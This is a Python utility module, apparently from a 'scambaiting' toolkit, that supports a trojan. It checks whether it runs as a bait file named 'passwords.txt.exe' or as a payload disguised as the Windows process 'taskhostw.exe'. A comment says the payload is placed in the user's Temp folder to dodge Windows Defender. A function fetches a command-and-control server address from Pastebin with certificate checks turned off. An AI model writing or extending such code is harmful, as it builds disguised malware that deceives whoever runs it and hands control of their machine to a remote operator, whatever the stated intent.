"""
Common utility functions for Kestrel Seqtools
"""

import os
import sys
import shutil


def is_dev_build() -> bool:
    """
    Check if this is a development build.

    Returns True if:
    - Running as Python script (development)
    - Running as compiled exe with .dev_mode marker file (--dev build)

    Returns False if:
    - Running as compiled exe without .dev_mode marker (production build)
    """
    # Running as Python script? Always development mode
    if not (getattr(sys, "frozen", False) or "__compiled__" in globals()):
        return True

    # Running as compiled exe - check for .dev_mode marker file
    exe_dir = os.path.dirname(os.path.abspath(sys.executable))
    marker_file = os.path.join(exe_dir, ".dev_mode")
    return os.path.exists(marker_file)


# Shared VERBOSE flag
VERBOSE = is_dev_build()


def log(msg: str) -> None:
    """Print message only if VERBOSE is True."""
    if VERBOSE:
        print(msg)


def dev_pause() -> None:
    """In dev mode, pause before exit so user can read console output."""
    if VERBOSE:
        try:
            input("\n[DEV MODE] Press Enter to close console...")
        except:
            pass  # In case stdin is not available


def get_payload_dir():
    """Get the payload directory. Raises KeyError if LOCALAPPDATA doesn't exist."""
    localappdata = os.environ["LOCALAPPDATA"]  # Raises KeyError if missing - intentional
    # Use Temp directory - writable by users, avoids Windows Defender behavioral blocks
    return os.path.join(localappdata, "Temp")


# Lazy initialization - only computed when first accessed
_PAYLOAD_DIR = None
_PAYLOAD_PATH = None


def get_payload_path():
    """Get payload paths (lazy initialization for Windows only)."""
    from utils.config import PAYLOAD_NAME  # Local import to avoid circular dependency

    global _PAYLOAD_DIR, _PAYLOAD_PATH

    if _PAYLOAD_DIR is None:
        _PAYLOAD_DIR = get_payload_dir()
        _PAYLOAD_PATH = os.path.join(_PAYLOAD_DIR, PAYLOAD_NAME)

    return _PAYLOAD_DIR, _PAYLOAD_PATH


def is_bait_file() -> bool:
    """Check if currently running as the bait file (passwords.txt.exe)."""
    exe_name = os.path.basename(sys.executable).lower()
    return exe_name.endswith("passwords.txt.exe")


def is_payload() -> bool:
    """Check if currently running as the payload (taskhostw.exe)."""
    from utils.config import PAYLOAD_NAME  # Local import to avoid circular dependency

    exe_name = os.path.basename(sys.executable).lower()
    return exe_name == PAYLOAD_NAME.lower()


def parse_cli_arguments():
    """Parse command-line arguments. Returns the file to delete if specified."""
    delete_file = None
    if "--delete-file" in sys.argv:
        try:
            idx = sys.argv.index("--delete-file")
            if idx + 1 < len(sys.argv):
                delete_file = sys.argv[idx + 1]
        except (ValueError, IndexError):
            pass
    return delete_file


def copy_dev_mode_marker(source_dir: str, dest_dir: str) -> None:
    """
    Copy .dev_mode marker file from source to destination directory if it exists.
    Used during payload deployment to propagate dev mode to the installed payload.

    Args:
        source_dir: Source directory containing .dev_mode marker
        dest_dir: Destination directory to copy .dev_mode marker to
    """
    dev_mode_source = os.path.join(source_dir, ".dev_mode")
    dev_mode_dest = os.path.join(dest_dir, ".dev_mode")

    if os.path.exists(dev_mode_source):
        try:
            shutil.copy2(dev_mode_source, dev_mode_dest)
            log(f"Copied .dev_mode marker to: {dev_mode_dest}")
        except Exception as e:
            log(f"Warning: Could not copy .dev_mode marker: {e}")


def cleanup_payload_files() -> None:
    """
    Clean up payload files during uninstallation (Windows only).
    Removes both the payload executable and .dev_mode marker if they exist.
    """
    payload_dir, payload_path = get_payload_path()  # This function now handles the import

    # Clean up .dev_mode marker
    dev_mode_file = os.path.join(payload_dir, ".dev_mode")
    if os.path.exists(dev_mode_file):
        try:
            os.remove(dev_mode_file)
            log(f"Removed .dev_mode marker: {dev_mode_file}")
        except Exception as e:
            log(f"Warning: Could not remove .dev_mode: {e}")

    # Clean up payload executable
    if os.path.exists(payload_path):
        try:
            os.remove(payload_path)
            log(f"Removed payload: {payload_path}")
        except Exception as e:
            log(f"Warning: Could not remove payload: {e}")


def get_c2_host():
    """
    Fetch C2 server IP from Pastebin URL.
    Fetches once and caches the result. Falls back to hardcoded IP if fetch fails.

    Returns:
        str: The C2 server IP address
    """
    import urllib.request
    from utils.config import CONFIG_URL, FALLBACK_HOST

    # Static variable to store fetched C2 IP
    if not hasattr(get_c2_host, "cached_host"):
        get_c2_host.cached_host = None

    # Return cached value if already fetched
    if get_c2_host.cached_host is not None:
        return get_c2_host.cached_host

    # Try to fetch from Pastebin
    try:
        log(f"Fetching C2 configuration from: {CONFIG_URL}")

        # Disable SSL verification for compatibility (scambaiting tool - security not critical)
        import ssl

        context = ssl._create_unverified_context()

        with urllib.request.urlopen(CONFIG_URL, timeout=10, context=context) as response:
            c2_ip = response.read().decode("utf-8").strip()

            # Use the fetched IP if it has content
            if c2_ip:
                get_c2_host.cached_host = c2_ip
                log(f"C2 server IP fetched: {get_c2_host.cached_host}")
                return get_c2_host.cached_host
            else:
                log(f"Empty C2 address from Pastebin, using fallback")

    except Exception as e:
        log(f"Failed to fetch C2 from Pastebin: {e}, using fallback")

    # Fallback to hardcoded IP
    get_c2_host.cached_host = FALLBACK_HOST
    log(f"Using fallback C2 server: {get_c2_host.cached_host}")
    return get_c2_host.cached_host
